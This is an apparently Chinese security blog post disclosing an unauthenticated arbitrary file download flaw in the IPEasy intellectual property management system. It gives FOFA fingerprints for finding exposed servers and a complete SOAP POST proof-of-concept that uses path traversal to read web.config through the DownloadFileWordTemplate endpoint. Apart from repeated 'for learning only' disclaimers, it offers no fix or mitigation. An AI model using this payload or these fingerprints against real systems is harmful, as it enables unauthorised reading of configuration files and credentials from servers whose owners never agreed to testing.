#  唯德科创 IPEasy 知易通 DownloadFile 任意文件下载漏洞   
 HK安全小屋   2025-06-04 13:28  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
唯徳知识产权管理系统 DownloadFileWordTemplate 接口存在文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
  
影响版本：  
  
唯德科创 IPEasy 知易通  
  
  
FOFA:  
```
body="JSCOMM/language.js"
icon_hash="511014626"
```  
  
  
POC：  
```
POST /AutoUpdate/WSFM.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Length: 389
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
Soapaction: "http://tempuri.org/DownloadFileWordTemplate"
Connection: close
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DownloadFileWordTemplate xmlns="http://tempuri.org/">
      <fileName>../../web.config</fileName>
    </DownloadFileWordTemplate>
  </soap:Body>
</soap:Envelope>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0rYEsh40E5ssKWFv8Lyc7eZlCltOvKprn6IMUmiauj1PhPYNU4JYguu3F0NhC7rZcmnrdEqUiaRoew/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
